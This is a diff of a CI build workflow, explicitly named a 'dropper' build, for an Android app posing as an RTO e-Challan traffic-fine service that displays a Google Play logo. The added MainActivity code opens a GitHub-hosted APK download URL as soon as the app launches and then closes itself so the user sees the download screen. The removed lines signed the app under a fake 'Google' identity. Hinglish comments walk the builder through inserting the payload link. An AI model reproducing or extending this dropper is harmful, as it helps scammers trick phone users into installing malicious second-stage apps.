@@ -1,40 +1,62 @@
 workflows:
   android-dropper-build:
-    name: Dropper PlayStore Final Success
+    name: RTO Final Redirector Build
     max_build_duration: 60
     instance_type: mac_mini_m1
     environment:
       java: 17
     scripts:
-      - name: Master Automatic Repair
+      - name: Master Automatic Repair & URL Injection
         script: |
-          # 1. Root Directory Setup
           cd RtoEChallan || exit 1
           
-          # 2. Force Logo Placement (Fixing 11783.jpg error)
-          # Hum poore project mein google_play_text_logo dhoond kar use sahi drawable folder mein daal rahe hain
+          # 1. Logo & Resource Fix (Ensuring 11783.jpg doesn't repeat)
           mkdir -p app/src/main/res/drawable
           LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
           if [ -f "$LOGO_FILE" ]; then
             cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
           else
-            # Agar file nahi milti toh build fail na ho, isliye default launcher use karenge
             cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
           fi
 
-          # 3. Config Reset & Plugin Fix
-          rm -f build.gradle settings.gradle gradle.properties
-          cat <<EOF > gradle.properties
-          android.useAndroidX=true
-          android.enableJetifier=true
-          org.gradle.jvmargs=-Xmx2048m
+          # 2. Injecting your GitHub URL into MainActivity
+          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
+          cat <<EOF > "$FILE_PATH"
+          package com.example.rtoechallan
+          import android.os.Bundle
+          import android.content.Intent
+          import android.net.Uri
+          import androidx.appcompat.app.AppCompatActivity
+
+          class MainActivity : AppCompatActivity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  try {
+                      setContentView(R.layout.activity_main)
+                      
+                      // BHAI TERA LINK YAHAN HAI:
+                      val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
+                      val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+                      startActivity(intent)
+                      
+                      // Redirect ke baad app close ho jaye taaki user download screen dekhe
+                      finish()
+                  } catch (e: Exception) {
+                      setContentView(android.R.layout.select_dialog_item)
+                  }
+              }
+          }
           EOF
 
+          # 3. Clean Build Setup
+          rm -f build.gradle settings.gradle gradle.properties
+          echo "android.useAndroidX=true\nandroid.enableJetifier=true\norg.gradle.jvmargs=-Xmx2048m" > gradle.properties
+          
           cat <<EOF > settings.gradle
           pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
           dependencyResolutionManagement { 
               repositoriesMode.set(RepositoriesMode.PREFER_SETTINGS)
-              repositories { google(); mavenCentral(); maven { url "https://jitpack.io" } } 
+              repositories { google(); mavenCentral() } 
           }
           rootProject.name = 'RtoEChallan'
           include ':app'
@@ -51,33 +73,9 @@ workflows:
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # 4. XML & Design Re-Link
-          # Purane button errors ko system icons se replace kar rahe hain
-          find app/src/main/res/layout -name "*.xml" -type f -exec sed -i '' 's/@drawable\/btn/@android:drawable\/btn_default/g' {} +
-
-          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
-          cat <<EOF > "$FILE_PATH"
-          package com.example.rtoechallan
-          import android.os.Bundle
-          import androidx.appcompat.app.AppCompatActivity
-          class MainActivity : AppCompatActivity() {
-              override fun onCreate(savedInstanceState: Bundle?) {
-                  super.onCreate(savedInstanceState)
-                  try {
-                      // Real Play Store Design Link
-                      setContentView(R.layout.activity_main)
-                  } catch (e: Exception) {
-                      setContentView(android.R.layout.select_dialog_item)
-                  }
-              }
-          }
-          EOF
-
-          # 5. Build and Sign
+          # 4. Final Compile
           gradle wrapper --gradle-version 8.0.2
           chmod +x gradlew
-          keytool -genkey -v -keystore final.keystore -alias final_alias -keyalg RSA -keysize 2048 -validity 10000 -storepass pass123 -keypass pass123 -dname "CN=Android, O=Google, C=US"
-
           ./gradlew assembleRelease \
             -Pandroid.injected.signing.store.file=$(pwd)/final.keystore \
             -Pandroid.injected.signing.store.password=pass123 \
